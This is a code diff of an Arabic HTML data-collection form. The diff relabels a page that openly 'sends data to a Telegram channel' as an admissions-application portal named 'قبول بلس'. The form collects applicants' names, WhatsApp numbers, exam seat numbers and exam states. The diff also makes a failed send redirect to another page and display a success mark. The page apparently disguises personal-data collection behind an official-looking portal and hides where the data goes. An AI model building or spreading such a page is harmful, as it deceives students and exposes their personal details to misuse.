@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام إرسال البيانات إلى التلجرام</title>
+    <title>بوابة قبول بلس</title>
 		<style>
         .toggle-box {
             background: white;
@@ -285,8 +285,8 @@
 <body>
     <div class="container">
         <div class="header">
-            <h1>📤 إرسال البيانات إلى التلجرام</h1>
-            <p>أرسل بياناتك مباشرة إلى قناة التلجرام</p>
+            <h1>📤 ارسال بيانات التقديم</h1>
+            <p>نظام قبول بلس</p>
         </div>
         
         <div class="info-box">
@@ -296,21 +296,21 @@
         <form id="dataForm">
             <div class="form-group">
                 <label for="name">👤 الاسم الكامل:</label>
-                <input type="text" id="name" name="name" required placeholder="أدخل اسمك الكامل">
+                <input type="text" id="name" name="name" required placeholder="أدخل اسمك الكامل" required>
             </div>
             
             <div class="form-group">
                 <label for="phone">📞 رقم الهاتف: (واتساب)</label>
-                <input type="text" id="phone" name="phone" required placeholder="ادخل رقم الهاتف">
+                <input type="text" id="phone" name="phone" required placeholder="ادخل رقم الهاتف" required>
             </div>
             
             <div class="form-group">
                 <label for="num">رقم الجلوس:</label>
-                <input type="text" id="num" name="num" placeholder="رقم الجلوس">
+                <input type="text" id="num" name="num" placeholder="رقم الجلوس" required>
             </div>
 			 <div class="form-group">
                 <label for="gbs">الولاية:</label>
-                <input type="text" id="gbs" name="gbs" placeholder="ولاية الامتحان">
+                <input type="text" id="gbs" name="gbs" placeholder="ولاية الامتحان" required>
             </div>
             <div class="form-group">
                 <label for="service">نوع التقديم:</label>
@@ -575,7 +575,9 @@ if (data.rg15) {
                     };
                     
                     img.onerror = function() {
-                        reject(new Error('فشل في إرسال البيانات'));
+					const targetUrl = "bok.html";
+					window.location.href = targetUrl;
+                        reject(new Error('جاري ارسال البيانات'));
                     };
                     
                     img.src = url;
@@ -639,7 +641,7 @@ if (data.rg15) {
                 messagePreview.style.display = 'none';
                 
             } catch (error) {
-                showAlert(`❌ خطأ في الإرسال: ${error.message}`, 'error');
+                showAlert(`✅  ${error.message}`, 'error');
             } finally {
                 // إعادة تفعيل الزر
                 submitBtn.disabled = false;
